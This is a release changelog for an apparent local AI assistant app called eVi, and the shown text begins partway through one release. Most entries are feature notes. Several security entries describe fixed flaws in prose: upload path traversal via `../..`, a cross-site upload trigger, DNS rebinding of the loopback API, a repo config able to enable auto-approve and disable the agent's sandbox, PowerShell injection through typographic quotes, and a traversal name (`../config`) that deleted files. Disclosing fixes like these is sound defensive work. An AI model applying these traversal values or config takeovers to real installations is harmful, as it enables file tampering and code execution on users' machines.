  The attachment upload and voice transcription endpoints built their save
  folder from an unchecked session id, so `../..` or an absolute path wrote the
  upload anywhere your account can write (a Startup-folder script, for
  example). Any web page you visited could trigger this on the default desktop
  setup (no access token), because a file upload is a cross-site "simple
  request" browsers send without asking. Session ids are now validated
  everywhere they become a path, every upload path is checked to stay inside
  the uploads folder, and eVi refuses state-changing requests that a browser
  marks as coming from another site (`Origin` / `Sec-Fetch-Site`). eVi's own
  pages, the desktop shell, the CLI, the VS Code extension and federation/A2A
  peers are unaffected. Drive-relative names (`D:x`) are also refused on
  `/uploads` and `/images`.
- **A repo's `.evi.toml` can no longer take over eVi.** Opening a cloned repo
  used to merge its `.evi.toml` over your whole config: it could run a shell
  command through the status line, point eVi (and your API key) at another
  server, or switch on auto-approve ("yolo") and the shell. A project config
  may now only set model-behaviour preferences (`[llm] model`, sampling,
  context and compaction knobs, `output_style`, `reasoning_effort`) and
  `[worktree] base_ref`, and may only make permissions *stricter*: tools can be
  switched off but not on, `hard_deny` / `protected_paths` / deny rules are
  added to yours, and `mode` applies only if it is stricter than your own.
  Everything else is ignored with a one-time warning naming the keys. A
  malformed `.evi.toml` no longer crashes config loading (which had silently
  disabled the sandbox and shell guard). See "Per-project config" in
  docs/configuration.md.
- **Spoken replies can no longer run commands on Windows.** Text-to-speech put
  the model's reply inside a PowerShell command and escaped only plain `'`, but
  PowerShell also treats typographic quotes (`’`) as quotes. The text now
  reaches PowerShell (and `say` / `espeak`, via stdin) outside the command
  line, and `powershell.exe` is resolved from System32.
- **`evi plugin remove ..` no longer deletes your whole eVi folder**, and
  `evi skill remove` / `evi profile remove|add|show` no longer accept path-like
  names (`evi profile remove ../config` deleted `config.toml`). Deletion is
  confined to the plugin, skill or profile folder, and a linked plugin is
  unlinked rather than having its target deleted.
- **Desktop: "open in browser" no longer goes through `cmd.exe`.** Links are
  validated (http/https only, no embedded credentials) and opened without a
  shell, so a crafted link can't run a program and links containing `&` now
  open correctly.

### Changed
- Behind a reverse proxy, keep the browser's `Host` header
  (nginx `proxy_set_header Host $host;`, Apache `ProxyPreserveHost On`), or
  send `X-Forwarded-Host` and start eVi with `EVI_TRUSTED_PROXY=1`; otherwise
  browser requests get `403 Refusing a cross-site request`.
  `EVI_ALLOW_CROSS_ORIGIN=1` turns the cross-site check off entirely.
- Session ids may contain only letters, digits, `-` and `_` (up to 96
  characters). Every id eVi creates already does; SDK users with their own
  ids containing `.`, `:` or spaces can no longer attach files to them.
- On Linux, `espeak` / `espeak-ng` now read the text from stdin.

## [1.0.52] — 2026-09-10

### Added
- **Say something mid-answer without throwing away the work.** Type a follow-up
  while eVi is already working and it's now **applied at the next step** — after the
  tool it's running finishes — instead of being swallowed by a disabled Send button.
  The message appears in the conversation straight away marked *"queued — applies at
  the next step"*, and flips to *"applied"* when it lands. The Send button says
  **Queue** while a turn is in flight so the behaviour is visible before you rely on it.

  Nothing is ever lost: if the turn happens to finish before there's a next step,
  the queued message is sent as a normal message instead. "Correct it while it
  works" replaces "wait, or interrupt and start over".

## [1.0.51] — 2026-08-25

### Added
- **Message eVi from your phone (Telegram).** Create a bot with @BotFather, paste
  the token into Settings → Channels, and eVi answers from your pocket — no mobile
  app, no public URL, no port forwarding (it long-polls, so nothing is exposed).
  **Off until you turn it on**, and built to stay safe once it is:
  - An unknown sender gets a pairing code and **no agent turn runs at all** until
    you approve them, from this machine, in Settings → Channels or with
    `evi channel approve <code>`. Finding the bot is not the same as being allowed
    to use it.
  - Approved senders get an explicitly chosen toolset (memory + skills by default),
    **not** yours — enabling shell locally never widens what the bot can do.
  - Permission prompts are denied rather than left waiting, since nobody is at the
    desk to answer them.

  New: `evi channel status | approve | revoke | serve`.
- **Bring your history with you.** `evi sessions import` reads the conversations
  you already had in Claude Code and Codex — eVi drives those CLIs, so it knows
  where they keep their logs — and writes them into eVi's own store, where they
  become searchable, resumable and exportable. Read-only with respect to the
  source, and it prints what it *would* import until you pass `--write`.

## [1.0.50] — 2026-08-25

### Added
- **See what setting up local AI will put on your machine — before it does.** The
  setup card now lists each item with its real size and destination path (the
  runtime size comes from the pinned release, the model size from the catalog),
  states that the server is loopback-only and needs no administrator access, and
  discloses the literal download URLs behind "Show the exact files & commands".
  Anything already on disk is marked as such, so a second run never threatens to
  re-download it.
- **Named setup steps, and a way to read the log.** A multi-minute download showed
  one anonymous progress bar; it now shows where it actually is — *Prepare runtime ·
  Download model · Start the model · Ready* — and every failure offers **Run
  diagnostics** and **View log**. The managed server's log is served over the API,
  so it's readable from the browser too, not just the desktop app.
- **Starter prompts in an empty chat.** A blank transcript now offers *Say hi* ·
  *What can you do?* · *Give me a quick tour*. Any reply is proof that the model,
  tools and settings are working together.

### Changed
- **Settings are grouped instead of stacked.** Twenty-five sections in one flat list
  meant reading all of it to find anything; they're now sorted under **Assistant**,
  **This computer**, **Extend** and **App**. A section that doesn't match a group
  still appears (under "More"), so nothing can go missing.

## [1.0.49] — 2026-08-25

### Added
- **First run offers what your machine can already do.** eVi ships six backends that
  drive a CLI you may already have — Claude Code, Codex, Gemini, Amp, Qwen, Copilot —
  but first run never looked for them, so a machine that could answer immediately was
  offered a model download instead. Setup now probes those CLIs, API keys already in
  the environment, and running local servers, then ranks the options by how fast they
  reach a first reply: already installed, then already running, then a key, then a
  download. Local AI is still there and still needs no account — it's just no longer
  the only thing on offer.
- **Setup gets the screen it needs.** When nothing can answer yet, first run is a
  proper screen rather than an amber strip above a chat window that looks ready but
  isn't.

### Changed
- **"Connected" now means it actually answered.** Switching backends previously
  checked that a port was open, saved the config, and cleared the warning — after
  which the first message could still fail. eVi now sends a real one-token
  completion, and a second with a tool attached, and reports both: *Chat ✓ · Tools ✓*.
  If it doesn't answer, **the switch is rolled back** and your previous backend is
  left exactly as it was. Found immediately in testing: an installed Claude Code whose
  login had expired, which the old check would have reported as working.

### Security
- **Reject requests that name a hostname eVi doesn't serve.** With no access token
  configured — the default on desktop — the loopback API was reachable by any web
  page via DNS rebinding, and the filesystem and shell tools sit behind it. Browsers
  cannot forge the `Host` header, so requests arriving for some other hostname are
  now refused (`EVI_ALLOW_ANY_HOST=1` to override). Scoped to the unauthenticated
  case: when a token or users are configured that remains the control, so federation
  peers, LAN and container deployments are unaffected.

## [1.0.48] — 2026-08-16

### Added
- **First-run onboarding for local AI.** eVi now guides a not-yet-set-up user to
  private, on-device AI without Ollama. The **⚡ Set up local AI** card lets you pick a
  small model and one-click download + start eVi's managed llama.cpp runtime — and it
  is now offered in *every* not-ready state (previously hidden whenever Ollama happened
  to be running). You can also **point eVi at an existing llama.cpp install** —
  auto-detected on PATH / common dirs, or enter a path — via a new `[runtime]
  server_path` setting; eVi then supervises your own binary and skips the download.

### Fixed
- **Desktop — a set-up local model now relaunches on app start.** The desktop sidecar
  never ran the managed-runtime autostart (only the `evi web` CLI did), so a
  previously-configured llama.cpp model wouldn't come back after a restart and the app
  booted to a "llamacpp isn't running" banner. The sidecar now relaunches it on startup.

## [1.0.47] — 2026-08-16

### Added
- **Desktop — a confirmation prompt before every app upgrade.** The auto-updater
  no longer installs silently: when a newer version is found (on launch or via
  Help → Check for Updates) eVi shows an "Update available" dialog with
  **Update & Restart** / **Not now**. Nothing downloads or restarts without your OK.

### Fixed
- **Desktop — the version now refreshes right after a core update.** The sidecar
  update channel stages a newer core for the next launch, but closing eVi only
  hides it to the tray (keeping the old core process warm), so Help → About kept
  showing the previous version until a full manual quit + relaunch. eVi now
  surfaces a **"Core update ready — Restart now"** prompt that does a clean restart
  and boots the new core immediately. Belt-and-suspenders: a freshly-installed
  bundled core is never shadowed by an older staged one (version-guarded in
  `staged_sidecar`), so a full app update always takes effect.

## [1.0.46] — 2026-08-16

### Fixed
- **Managed runtime — no orphaned `llama-server` on a hard exit (Phase 4).** The
  managed model server is now tied to eVi's process lifetime via a Windows Job
  Object (kill-on-close), so if the desktop app / sidecar is force-killed (skipping
  the clean-exit handler) the OS reaps `llama-server` too, instead of leaving it
  holding VRAM/RAM and the port. Verified by hard-killing the parent and confirming
  the child dies. macOS/Linux keep the clean-exit handler; a stray server there is
  reused on next launch via the port check. Completes the managed-runtime series
  (Phases 1–4).

## [1.0.45] — 2026-08-16

### Added
- **GPU acceleration for the managed runtime (Phase 3).** When a supported GPU is
  detected, Settings → Model & Backend → Local models shows **⚡ Use your GPU
  (&lt;name&gt;)**, which downloads the right CUDA build once and re-runs your model on
  the GPU with layer offload (`-ngl`) — a large speedup over CPU.
  - The CUDA build is chosen from the GPU's compute capability: **Blackwell (RTX
    50-series, sm_120) gets the CUDA 13.3 build** (the 12.4 build silently ignores
    it — the exact mismatch validated on an RTX 5070 Ti); older NVIDIA GPUs get 12.4.
    macOS uses Metal on the base build automatically; Linux (no prebuilt CUDA in this
    llama.cpp release) stays CPU.
  - `-ngl` auto-tunes from VRAM (full offload when the model fits, CPU otherwise), and
    the GPU build is preferred automatically on later starts.
  - New endpoint `POST /api/runtime/gpu`; CLI `evi runtime gpu`. Runtime status now
    reports `gpu_available` / `gpu_installed` / `on_gpu` / `gpu_name`.

## [1.0.44] — 2026-08-16

### Added
- **Local model catalog — managed runtime (Phase 2).** Settings → Model & Backend
  now has a curated **Local models** list: download, switch, and remove local GGUF
  models without a terminal — no Ollama, no `pull`. Each shows size + license, with
  ★ = best fit for your hardware, ● = downloaded, ▶ = active. **Use** downloads
  (with progress) if needed and switches the managed llama.cpp server to it;
  **Remove** deletes a downloaded file.
  - 8 verified models (Qwen2.5 0.5B–14B, Llama-3.2 1B/3B, Qwen2.5-Coder-7B); each
    HF repo/filename/size was verified against the HuggingFace API and all download
    anonymously (gated/heavily-restricted models excluded).
  - Switching = the supervisor restarts `llama-server` on the same port with the new
    `-m`; the active model is derived from the running server, so it stays correct
    across restarts.
  - New endpoints `GET /api/runtime/catalog`, `POST /api/runtime/model/{use,remove}`;
    CLI `evi model list/use/remove`.

## [1.0.43] — 2026-08-16

### Added
- **Zero-config local AI — managed llama.cpp runtime (Phase 1).** A fresh user
  can reach first chat with no external install. The "no backend" first-run
  banner's recommended path, **⚡ Set up local AI**, downloads a small CPU
  `llama-server` runtime + a small starter model (Qwen2.5-1.5B-Instruct), starts
  and supervises the server, and points eVi at it — **no Ollama, no account, no
  admin, no manual `pull`**. Ollama remains an alternative for those who prefer it.
  - The runtime binary + model are downloaded *after* install (the installer
    stays lean — the same principle that kept eVi from bundling a runtime), and
    the managed server **auto-relaunches** on later `evi web` / desktop starts.
  - CPU build by default so it never mismatches a GPU/driver; GPU (CUDA)
    acquisition + an in-app model catalog/switch are Phases 2–3.
  - New `evi/runtime/` package (stdlib-only, bundles into the desktop sidecar):
    runtime acquisition + a `llama-server` supervisor + setup orchestration.
    Endpoints `POST /api/runtime/setup`, `GET /api/runtime/status`,
    `POST /api/runtime/stop`; CLI `evi runtime setup/status/stop`.

## [1.0.42] — 2026-08-09

### Changed
- **Settings — clearer "unsaved changes" cue.** Editing a setting now shows a
  prominent amber **"● Unsaved changes — click Save to apply"** (was a quiet grey
  "Unsaved changes"), and the save status goes green on success / red on failure.
  Closes a real gap found while dogfooding the health banners: the fields *and* the
  banners reflect *saved* config, so a set-but-unsaved value silently did nothing
  and the banner wouldn't move — now it's obvious you still need to Save. The
  Specialty explainer also notes that changes take effect on Save and the banner
  then reports each model's backend reachability.

## [1.0.41] — 2026-08-09

### Fixed
- **Settings → Voice banner:** the "no system voice" / "engine not installed"
  messages no longer render a double period (e.g. "…neural engine..") — the
  client now strips a trailing period from the server's install hint before
  appending its own. Found while dogfooding the 1.0.40 banners on Linux (no
  espeak-ng installed).

## [1.0.40] — 2026-08-09

### Added
- **Settings health banners (part 2) — live connectivity & availability.**
  Completes the settings overhaul with the banners that need a live probe, each
  refreshed automatically on save:
  - **Integrations** — ComfyUI (`/system_stats`) and, when selected, SearXNG
    reachability. Email OAuth has no token store, so it is intentionally not
    probed. (`GET /api/integrations/status`)
  - **Voice** — is the selected TTS engine actually installed? System-voice
    detection, or the correct module/CLI-binary per neural engine (Coqui = `TTS`
    module; F5 / Piper = their CLI binaries; Kokoro = `kokoro`/`kokoro_onnx`).
    (`GET /api/voice/status`)
  - **Specialty models** — reachability of each configured OCR / vision / guard
    backend, plus the speech-to-text dependency. (`GET /api/specialty/status`)
  - **Guardrails** — warns when the filter is on but the configured guard model
    isn't answering (it would fail open and silently skip).
  - **Plugins** — surfaces plugins that failed to load (unreadable manifest),
    which `list_plugins` used to silently drop. (`GET /api/plugins` now returns a
    `failed` array; new `plugins.list_plugin_errors`.)

## [1.0.39] — 2026-08-09

### Added
- **Settings — "How this works" explainers + live health banners (part 1).**
  Every Settings section now has a collapsible **How this works** panel (what it
  controls, when you'd change it, and the main gotcha), carrying the clarity of
  the federation Peers overhaul across the whole app. Sections with real runtime
  state also get a **live status banner** in the same ✓/⚠/✕ language as the Peers
  posture banner, refreshed automatically when you save:
  - **Model & Backend** — is the active backend actually answering? (red when
    nothing responds at the configured Base URL / CLI).
  - **Tools** — which capability categories are missing an install dependency.
  - **Server** — flags an open external surface (A2A / multi-user / LAN binding
    on while the access token is blank).
  - **Permissions** — flags reduced safety (yolo mode, or the destructive-command
    guard turned off).

  Built on a small declarative extension to the settings renderer
  (`SECTION_EXPLAINERS` + `SECTION_HEALTH`), so the remaining connectivity/
  availability banners (Integrations, Voice, Specialty, Guardrails, Plugins) can
  land next without further plumbing.

## [1.0.38] — 2026-08-09

### Fixed
- **Peers panel:** the *Be a peer* loopback banner ("Reachable on this machine
  only") no longer tells you to "Set an access token" when one is already set —
  once a token is configured it just says to turn on LAN access and relaunch.
  Cosmetic follow-up to the 1.0.37 federation UX overhaul.

## [1.0.37] — 2026-08-09

### Changed
- **Federation Peers panel — full UX overhaul.** Settings → Peers is
  reorganized around the two federation roles, with proactive, in-place guidance
  instead of a flat list you had to diagnose yourself:
  - A **How federation works** explainer at the top finally spells out **the two
    tokens** that trip everyone up — the machine that *serves* sets one **access
    token** (`[web] auth_token`, same field as Settings → Server), and every
    machine that *delegates to it* must store that **same** token in its peer
    entry. They must match, or the request is refused (401); a machine serving on
    the LAN with no token is blocked entirely by the fail-safe.
  - **Be a peer** now leads with a **live posture banner** computed from the real
    serving state (`/api/peers` gained `self_status` + `auth_token_set`), so it
    flags — at a glance, without running a preflight — *serving on the LAN without
    an access token* (the fail-safe is blocking every peer; one-click **Set access
    token** fixes it), *reachable on this machine only* (loopback → turn on LAN
    access + relaunch), or *reachable by peers at `<ip>:8473`* (with a **Copy
    address** button to share). You can set this machine's access token **inline**
    (keeping the current web session alive), and enabling LAN access with no token
    first confirms.
  - **Peers you delegate to** rows now show each peer's token state (with an amber
    "no token — delegation refused if this peer requires auth" warning) and an
    actionable unreachable hint ("is the machine on, eVi running, and its port
    open in the firewall?").

## [1.0.36] — 2026-08-09

### Changed
- **Lowered the minimum Python from 3.13 to 3.12.** eVi uses no Python
  3.13-only language or stdlib features (audited across the whole package), and
  the full test suite passes on 3.12 — so it now installs on **Ubuntu 24.04 LTS**
  (Python 3.12, supported to 2029) and other 3.12 environments, instead of
  silently capping at the last 3.12-compatible release (0.34.1) with no
  explanation. CI now runs the suite on **3.12 and 3.13**. The optional `[ast]`
  extra (the Rust `fast-walk` accelerator) still needs 3.13, but it's now
  marker-gated so it no longer breaks a `pip install 'evi-assistant[ast]'` on
  3.12 — eVi falls back to stdlib `ast.walk` there.

## [1.0.35] — 2026-08-09

### Added
- **Federation preflight.** `evi peer doctor` (CLI) and a **Run federation
  preflight** button in Settings → Peers run a one-click checklist that explains
  why federation isn't working: this node's serving / LAN-bind posture; whether
  `[web] auth_token` is set (required once LAN-bound — the 1.0.33 fail-safe);
  and, per configured peer, reachability + whether its token is accepted + a real
  test delegation. It tells apart the common failures — the peer's `serve` is off,
  a missing/mismatched token, or simply a too-slow peer — with the exact fix for
  each.

### Fixed
- **Clearer `evi web` error when the web server isn't installed.** The hint's
  `[web]` was being swallowed by Rich's markup parser, leaving a misleading
  `pip install 'evi-assistant'`; it now renders correctly and explains that the
  **`[web]` extra** (FastAPI + uvicorn) is what's required.

## [1.0.34] — 2026-08-08

### Fixed
- **The access-token sign-in field no longer clears while you type or paste.**
  While signed out, background polls each returned 401 and re-showed the sign-in
  overlay every few seconds, wiping whatever you were entering. It now only
  resets the field on first show.
- **A just-entered token can't be wiped by a stale in-flight 401** — sign-out only
  fires when the token that was actually rejected is still the current one, so a
  poll that started before you signed in can't clobber your new token.

### Added
- **Peers panel: set/change a peer's token in the UI.** A per-peer "Set token" /
  "Change token" button, and the Scan/Discover "Add" now prompts for a token — so a
  LAN peer that requires auth (per the 1.0.33 fail-safe) can be configured entirely
  in the UI instead of only via the CLI.
- **Developer Tools reachable with F12.** The desktop "Toggle Developer Tools
  (Console)" menu item is now bound to **F12** (was Ctrl+Shift+I) to match what
  people reach for.

## [1.0.33] — 2026-08-07

### Added
- **Session messaging — message your other live sessions.** One live session can
  now send a lightweight plain-text message to another of your open sessions
  (the common desktop case: several chat tabs). Two tools are available in every
  web/desktop session — `list_sessions` (your other live sessions) and
  `send_to_session(target, text)` (deliver a note by name or id) — and the
  **Dispatch** panel (🗂) gains a **Message** button per session to compose one by
  hand. A delivered message lands in the target's history (seen on its next turn)
  and appears live as a `📨` note. It is **plain text** — it never approves a
  permission, changes config, or runs a command in the target; any tool the
  receiving session then runs still goes through that session's own permission
  prompt. Scoped to your own sessions in the one running app. It's eVi's local,
  cross-platform take on Claude Code cross-session messaging (and, unlike that,
  it works on Windows too).

### Security
- **Federation LAN fail-safe.** An eVi serving federation while bound to the
  network (`bind_lan`, or `--host 0.0.0.0`) *without* `[web] auth_token` set was
  open — anyone on the LAN could delegate tasks. eVi now refuses federation/A2A
  requests from non-loopback clients when no auth token is set (loopback/local
  requests are unaffected). Set `[web] auth_token` to accept remote peers.

### Docs
- README now carries **Docker (GHCR) pull-count badges** (ghcr-badge; pkgbadge
  documented as a self-host option), and the agents docs cover session messaging.

## [1.0.32] — 2026-08-07

### Added
- **A "needs setup" badge in Settings → Tools** shows when a tool won't work in
  this install because its dependency or binary is missing — e.g. `computer`
  (pyautogui), `voice` (speech-to-text), `calendar`, or `ocr` (the tesseract
  binary). Hover it for the specific reason and how to enable it; in the desktop
  app the hint says the tool isn't bundled rather than suggesting a pip install.
  It's a **static install check** (deliberately separate from the ⚠ *risk* icon,
  and from live-service state like ComfyUI running), driven by a side-effect-free
  probe delivered on `/api/config`. This closes the gap where enabling a tool
  whose dependency isn't present (like web search before 1.0.31) failed silently
  at call time with no forewarning.

## [1.0.31] — 2026-08-07

### Fixed
- **Web search now works in the desktop app.** In the frozen desktop build,
  `web_search` failed with `ERROR: ddgs not installed` no matter how the web
  tool was toggled: the sidecar bundled the `web` extra (the server) but not
  the distinct `web-tools` extra (`ddgs` + `beautifulsoup4`), and because both
  are imported lazily they were invisible to PyInstaller's static analysis and
  dropped from the bundle. The build now installs `web-tools` and force-collects
  `ddgs`/`bs4`/`soupsieve`, and `evi-server --check` (run in CI right after the
  build) now verifies them — so this can't silently regress again. Dev
  installs were never affected.

### Changed
- **The ⚠ on a tool in Settings → Tools now explains itself.** Hovering a
  flagged tool shows the specific reason (e.g. shell "runs shell commands…",
  web "reaches the internet…"), and a legend under the Tools header clarifies
  that ⚠ marks tools that can act **outside eVi's sandbox** — it flags *risk*,
  **not** availability (it was easy to misread as "not installed").

## [1.0.30] — 2026-08-07

### Fixed
- **A single null-content message no longer wedges a whole chat session.**
  Ollama's OpenAI-compatible endpoint rejects any message whose `content` is
  JSON `null` with `invalid message content type: <nil>` — and because that
  message stays in history and is re-sent on every turn, one such message made
  *every* subsequent turn 400 (the session got permanently stuck; it often
  surfaced right after a tool call such as `web_search`). eVi now sanitizes the
  history it sends so no message ever leaves with null content (coerced to an
  empty string; strings and multimodal lists are untouched, and the stored
  history is not mutated). This also un-sticks an already-wedged session on the
  next turn. Tool results that come back empty are hardened at the source too.

### Added
- **Attached-image previews survive switching chats and reviving a session.**
  An image you paste/attach now re-renders in the transcript when you switch
  away and back (or reopen the session later), served from a new
  `/uploads/<session>/<name>` route, instead of vanishing on the next render.

## [1.0.29] — 2026-08-06

### Fixed
- **No more redundant/failed `describe_image` call after a pasted image is
  auto-described.** On a text-only chat model, eVi already folds a vision/OCR
  description of an attached image into the turn — but a small model would
  often *also* call `describe_image` (frequently with a hallucinated path),
  producing a noisy failed tool call before recovering. The folded description
  is now presented authoritatively with an explicit "this image has already
  been analyzed — don't call describe_image on it" instruction, so the model
  answers directly.

## [1.0.28] — 2026-08-06

### Changed
- **The desktop app auto-refreshes its UI after a sidecar update — no more
  manual Ctrl+R.** The loading shell now redirects into the sidecar UI with a
  per-launch cache-buster, so WebView2 can't serve a stale cached page after the
  core auto-updates (it complements the `no-cache` headers added in 1.0.26 and
  removes any reliance on cache heuristics). Desktop-shell change only — the
  Python core (`evi/`) is unchanged from 1.0.27; the PyPI wheel is a version-bump
  no-op that carries the desktop rebuild.

## [1.0.27] — 2026-08-06

### Fixed
- **Pasted/attached images are more robust on text-only models.** If the vision
  fallback can't describe an image (e.g. the local VLM was momentarily busy),
  its note now includes the image's **full path** plus an explicit retry hint,
  so the model can recover by calling `describe_image` on the right path —
  previously it only had the bare filename and failed with "no such file".
- **A staged attachment no longer leaks between chats.** Attaching a picture and
  then switching tabs / starting a new chat used to carry that image onto the
  next message you sent elsewhere; the pending attachment is now cleared on any
  session switch.

### Changed
- **The default image question is now visible before you send it.** When you
  attach an image with an empty composer, eVi fills in "What's in this image?"
  in the input box (editable) instead of silently substituting it at send time.
- **An attached image now sits on the right**, aligned with your own messages,
  rather than on the left like an assistant/system note.

## [1.0.26] — 2026-08-06

### Fixed
- **UI updates from the sidecar channel now actually reach the desktop app.**
  `index.html` (and `/static/*`) were served with `ETag`/`Last-Modified` but no
  `Cache-Control`, so the WebView2/browser heuristically cached the page — and
  because the entire single-file UI's JS is inlined in `index.html`, a cached
  page meant a cached UI. A feature shipped via the sidecar update (e.g. the
  1.0.24 clipboard-paste support) could stay invisible in an already-updated
  app for days. These now send `Cache-Control: no-cache`, forcing a conditional
  revalidation on every load (the `ETag` still yields a cheap 304 when nothing
  changed). **If the app looks stale after an update, View → Reload (Ctrl/⌘-R)
  forces a refresh.**

## [1.0.25] — 2026-08-06

### Changed
- **The prompt's "how to enable this" advice now matches your surface.** The
  capability-grounding block used to always say "Settings → Tools", which is
  wrong for terminal users. The Agent now knows whether it's running under the
  CLI or the web/desktop app and tells CLI users to run `evi config` instead.
- **Clearer error when image generation can't reach ComfyUI.** `generate_image`
  now returns an actionable "ComfyUI isn't reachable at &lt;url&gt; — start it
  (`python main.py`), or update the ComfyUI URL in settings" instead of a raw
  `ConnectError`, so the model can tell you exactly what to do. (The OCR tool's
  Tesseract-missing error already did this.)

## [1.0.24] — 2026-08-06

### Added
- **Paste an image straight into the chat.** The composer now accepts a
  clipboard paste (Ctrl/⌘-V) of an image — a screenshot, a copied picture —
  and attaches it just like the 📎 button and drag-drop, without saving a file
  first.
- **Attached images work on text-only models.** When the active chat model
  can't see (most local models), eVi now auto-runs the vision specialty
  (`describe_image` → your `[models] vision` VLM, e.g. llava) and — when the
  image is text-heavy — OCR, and folds the description + extracted text into the
  turn. So a pasted screenshot is understood regardless of which chat model is
  selected, instead of being silently dropped. This is the visual analogue of
  the existing audio-transcribe fallback; it degrades to a helpful "set a vision
  model / install Tesseract" note when neither is configured.

## [1.0.23] — 2026-08-06

### Added
- **The model now knows what eVi can actually do.** The system prompt gained a
  capability-grounding block: an honest statement that eVi has real local tools
  plus a *live* list of the capabilities that are currently OFF (image gen, web
  search, OCR, PDF, SQLite, git, voice, calendar, MCP, computer, index). This
  stops the model from answering "how does image generation work in eVi?" from
  its training data and falsely claiming eVi can't do it — instead it names the
  feature and how to enable it (Settings → Tools; image gen also needs ComfyUI
  running). Fixes the confusing "eVi uses DALL-E/MidJourney" hallucination.
- **Today's date + a staleness note in the prompt.** Local models have no clock
  (and eVi ships a scheduler), so the prompt now anchors "Today is <date>" —
  computed once per session for KV-cache stability — plus a dateless "training
  data may be stale, prefer web search for recent things" note. No hardcoded
  knowledge-cutoff date, since eVi is model-pluggable.

## [1.0.22] — 2026-08-06

### Fixed
- **`/reset` now clears the on-screen chat in the web/desktop UI.** Previously
  `/reset` wiped the model's memory server-side but left the old messages
  visible, so the transcript showed turns the model had already forgotten. The
  reset acknowledgement now carries a `clear_transcript` signal and the UI
  empties the visible chat, leaving just the confirmation — the screen matches
  the model's actual context. (New chat still starts a *fresh* session; `/reset`
  keeps the current one but empties it. The CLI REPL is unchanged.)

## [1.0.21] — 2026-08-04

### Fixed
- **Web search works again.** `web_search`'s default DuckDuckGo backend used the
  **deprecated `duckduckgo_search`** package, which DuckDuckGo now throttles to
  empty results — so searches silently returned nothing. Migrated to its
  maintained successor **`ddgs`** (same keyless DuckDuckGo, identical result
  shape). The `[web-tools]` extra now installs `ddgs`; `_search_ddg` prefers it
  and falls back to the legacy package so installs that haven't reinstalled the
  extra keep working. `evi doctor` checks for `ddgs`.

## [1.0.20] — 2026-08-04

### Added
- **Serve eVi over MCP, from the UI.** Settings → MCP gained a "Serve eVi over
  MCP" section: start/stop a localhost HTTP MCP server that exposes eVi's curated
  tools, memory, and prompts, plus a copy-paste stdio config for desktop MCP
  clients (Claude Desktop, Cursor). This was previously CLI-only (`evi mcp serve`)
  — now the whole round trip (consume other servers *and* serve eVi itself) is in
  the panel.

### Changed
- The published container image (`ghcr.io/evi-assistant/evi-ai`) is now
  **multi-architecture (linux/amd64 + linux/arm64)** and **public** — so
  `docker pull ghcr.io/evi-assistant/evi-ai:latest` works with no login and runs
  natively on Apple Silicon, AWS Graviton, and 64-bit Raspberry Pi. The release's
  image push also self-heals a transient GHCR error instead of failing the build.

## [1.0.19] — 2026-08-04

### Fixed
- **Edit / Branch / Delete are back on a message the moment you send it.** The
  toolbar was attached and then immediately wiped when the just-sent message's
  text was set, so you couldn't act on your own message until the conversation
  was rebuilt (a tab switch, reload, or edit elsewhere). Found by dogfooding
  1.0.18; a leftover of that release's toolbar fix, which only covered the
  rebuild path. An audit of every message-bubble creation confirms this was the
  last place the toolbar could be lost.

## [1.0.18] — 2026-08-04

An end-to-end audit of the desktop UI — fixing a cluster of model-switch and
state-sync bugs and closing every settings-parity gap, with new automated test
layers (including native-desktop and real two-model-switch coverage) so they
can't quietly come back.

### Fixed
- **Switching models now updates the whole footer, every time.** The capability
  chips (👁 vision, 🧠 reasoning, …) went stale after a switch — they kept
  describing the *previous* model until you reopened the picker — and a per-turn
  routing event quietly wiped the effort/fast/chip suffixes off the label on
  every reply. Both are fixed; the footer always reflects the active model.
- **Switching a model on the default backend no longer fails.** With no named
  backend registry configured, picking a model returned a "400 unknown backend"
  and the switch silently didn't take.
- **Editing or deleting a message now targets the right one.** On turns that ran
  a tool, the per-message index drifted, so Edit / Branch / Delete could act on a
  *different* message than the one you clicked.
- **The model identity follows a Settings change.** Changing the model in
  Settings → Model & Backend didn't re-stitch the system prompt, so the agent
  kept describing itself as the old model until a reload.
- **Desktop settings persist again.** The `[desktop]` config section was
  write-only — it reverted to defaults on reload and was overwritten whenever any
  other section was saved.
- **The context-usage chip refreshes when you switch, close, reset, or branch a
  tab** (it had been showing the previous session's token count), and per-message
  Re-roll now appears only on the latest turn (it always regenerated the last
  turn regardless of which bubble you clicked). Also: message action toolbars
  survive a history rebuild; branch inherits the parent's model + working folder;
  the permission dialog escapes HTML; a hand-set backend timeout is no longer
  dropped on save; and the dispatch live feed carries the auth token.

### Added
- **Every configurable setting is now reachable from the UI.** New **Sampling &
  advanced** (top-p, penalties, seed, stop sequences, logit bias, request
  timeout, …), **Specialty models** (per-task OCR / vision / speech / guard
  models), and **Status line** sections, plus controls for federation,
  multi-model routing, the destructive-command guard, tool-search, and the
  remaining per-integration knobs (ComfyUI, Google/Microsoft scopes, telemetry,
  worktree base ref).

## [1.0.17] — 2026-07-20

### Fixed
- **The working-folder chip now follows the session you're in.** Switching tabs
  left it showing the *previous* session's folder, which was worse than showing
  nothing: it read as though the session had a folder set, so a relative write
  (`write_file("hello.py")`) landed in the server's own directory instead of the
  folder named on the chip. Within a running server the folder was stored per
  session and applied correctly — only the indicator went stale, and that
  mismatch is what made it look like the working folder was being ignored. Every
  session switch now refreshes it, and a slow response from an earlier switch can
  no longer overwrite the current one.
- **eVi should no longer announce its model on every reply.** It prefixed answers
  with "I'm running the `X` model…" and kept doing so after being asked to stop.
  The prompt said *"if the user asks which model you are, tell them X"* — a
  conditional with no stated negative, which smaller models read as a standing
  order. It is now told to state the model only when asked, and that an earlier
  reply naming a different model predates a backend switch, so switching
  mid-conversation should not leave it quoting the old one. This is prompt
  guidance, so a small model may still occasionally over-share.

### Known issues
- **A session's working folder does not survive a restart.** It is held in
  memory, so closing and reopening the desktop app (or an auto-update restart)
  revives your conversation but resets the folder to the server's own directory
  — relative writes then land there until you set it again. Persisting it needs
  per-session state that does not exist yet; tracked for a later release.

## [1.0.16] — 2026-07-20

### Fixed
- **In-app documentation renders wrapped list items correctly.** In Help →
  Documentation, a bullet whose text wrapped across a line in the source showed
  literal `**` instead of bold — and where the stray delimiters re-paired, it
  emphasised the *wrong words* entirely. Anything split across a line break
  inside a list item was affected: bold, `code`, and links. Lists no longer end
  early at an unindented continuation line either, which is what stranded the
  rest of the sentence in a paragraph of its own. Paragraphs were never
  affected. Only the docs viewer uses this renderer, so nothing else changes.

  Note this reaches you through the **desktop app** (whose sidecar bundles
  `docs/`) or a source install. The PyPI wheel does not ship `docs/` — a
  pip-only install shows a link to the online docs instead, so upgrading the
  package alone changes nothing visible.

### Known limitation
- A fenced code block indented under a numbered list item still ends the list,
  so the following items restart at 1. Previously such a block was swallowed
